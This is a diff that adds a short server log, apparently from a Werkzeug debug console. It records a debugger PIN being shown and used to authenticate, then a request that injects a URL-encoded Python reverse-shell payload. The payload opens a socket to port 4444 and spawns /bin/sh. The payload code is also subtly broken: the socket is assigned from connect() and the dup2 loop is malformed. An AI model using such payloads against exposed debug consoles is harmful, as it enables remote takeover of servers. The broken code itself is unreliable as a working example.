@@ -1,0 +1,5 @@
+ Debugger is active!
+ * Debugger PIN: 934-448-079
+127.0.0.1 - - [10/Nov/2023 21:14:42] "GET /console HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2023 21:14:51] "POST /console?__debugger__=yes&frm=0&cmd=pinauth&pin=934448079&s=ud4jfIjwiwIXH2lmxqVy HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2023 21:14:58] "GET /console?__debugger__=yes&frm=0&cmd=import%20socket,sys,os,pty%0As%3Dsocket.socket(socket.AF_INET,%20socket.SOCK_STREAM).connect(('127.0.0.1',%204444))%0A[os.dup2(s.fileno()),%20fd]%20for%20fd%20in%20(0,1,2)%0Apty.spawn('/bin/sh')&s=ud4jfIjwiwIXH2lmxqVy HTTP/1.1" 404 -
